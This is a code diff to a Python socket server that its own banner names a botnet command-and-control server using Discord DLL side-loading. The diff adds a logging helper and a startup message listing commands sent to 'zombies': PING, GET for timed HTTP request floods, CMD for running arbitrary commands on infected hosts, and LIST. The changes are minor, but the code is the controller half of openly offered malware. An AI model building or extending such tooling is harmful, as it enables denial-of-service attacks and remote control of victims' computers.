@@ -21,7 +21,7 @@ class ClientThread(threading.Thread):
                 data = self.client_socket.recv(1024).decode('utf-8')
                 if not data:
                     break
-                print(f"Received from {self.client_address}: {data}")
+                log_event(self,data)
             except ConnectionResetError as e:
                 print(e)
                 for client in clients:
@@ -30,6 +30,11 @@ class ClientThread(threading.Thread):
                         print('Client removed')
                 sys.exit(0) # kill thread?
         self.client_socket.close()
+
+def log_event(client : ClientThread, msg):
+    addr = client.client_address[0]
+    port = client.client_address[1]
+    print(f"[{addr}:{str(port)}] {msg}")
 
 def send_to_all_clients(message, clients):
     for client in clients:
@@ -40,7 +45,7 @@ def showList(clients):
         print("Lista vuota")
     for client in clients:
         elapsed_time = int(time.time()-client.timestamp)
-        print(f"{client.index}\t{client.client_address[0]}:{client.client_address[1]}\t{elapsed_time:.2f}s")
+        print(f"{client.index+1}\t{client.client_address[0]}:{client.client_address[1]}\t{elapsed_time:.2f}s")
 
 def handle_input(clients):
     while True:
@@ -60,6 +65,8 @@ def handle_input(clients):
     sys.exit(0)
 
 def main():
+    print("C2 BOTNET via DISCORD DLL SIDE LOADING")
+    print("Broadcast commands:\nPING\tchecks if zombies are alive\nGET\tperforms HTTP request specifying URL REQ/MIN MINS\nCMD\tperforms custom commands via zombies\nLIST\tchecks available hosts")
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_socket.bind((ATK_ADDR,ATK_PORT))
@@ -72,9 +79,9 @@ def main():
     index = 0
     while True:
         client_socket, client_address = server_socket.accept()
-        print(f"New connection from {client_address}")
-
         client_thread = ClientThread(client_socket, client_address, index)
+
+        log_event(client_thread,'ESTABLISHED CONNECTION')
         client_thread.start()
 
         clients.append(client_thread)
